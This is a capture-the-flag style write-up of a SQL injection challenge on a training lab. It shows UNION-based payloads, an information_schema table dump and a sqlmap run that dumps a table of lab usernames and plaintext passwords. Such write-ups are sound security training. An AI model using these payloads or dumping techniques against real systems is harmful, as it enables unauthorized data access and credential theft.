# Challange (SQL-Injection)

By sending injection payload with the item name we get positive results.

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/0484b247-3695-46bd-a03d-d577e3140c55)

On sending simple requests through Repeater we got the content length of 2516 with details of the product.

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/2de90f1a-a100-4b32-9e81-7e5a028eb6af)

On trying the Union query with payload: `' union select 1,2,3,4#` in the encoded form we get positive feedback.

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/89e4587c-4e0f-4017-a768-947d4a7a4a89)

On trying to extract the version info get the version in return.

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/6f73d06f-1057-4fa5-83da-e353a97667c2)

Dump table names using the cmd:`'+union+select+1,2,3,table_name+from+information_schema.tables%23`

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/dedd7170-d45e-48c8-a09e-5e90bfa63828)

Give a try with a tool called sqlmap, by coping request data to a file.

```bash
└─$ sqlmap -r challange -dump -t injection0x03
        ___
       __H__                                                                                                                                                                                                      
 ___ ___[.]_____ ___ ___  {1.7.6#stable}                                                                                                                                                                          
|_ -| . [.]     | .'| . |                                                                                                                                                                                         
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                      

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:57:47 /2023-07-15/

[10:57:47] [INFO] parsing HTTP request from 'challange'
[10:57:47] [INFO] setting file for logging HTTP traffic
[10:57:47] [INFO] resuming back-end DBMS 'mysql' 
[10:57:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: product (POST)
-----------------snip-----------------
Database: peh-labs
Table: auth0x03
[15 entries]
+---------------+----------------------+---------------+
| username      | password             | lockout_count |
+---------------+----------------------+---------------+
| jessamy       | 1q2w3e4r5t6y7u8i9o0p | 0             |
| jeremy        | q1w2e3r4t5y6u7i8o9p0 | 0             |
| admin         | letmein              | 0             |
| root          | zmxncbvgftr          | 0             |
| alex          | alexwashere          | 0             |
| raj           | password123          | 0             |
| takeshi       | onigiriotebetai      | 0             |
| hiro          | roosterCarsSunset5   | 0             |
| heath         | thecybermentor       | 0             |
| user1         | user1                | 0             |
| teamaster     | idrinklotsoftea      | 0             |
| operator      | alskdjfhg            | 0             |
| bob           | 123456               | 0             |
| alice         | password             | 0             |
| administrator | cheese               | 0             |
+---------------+----------------------+---------------+
```

W00t Cracked...
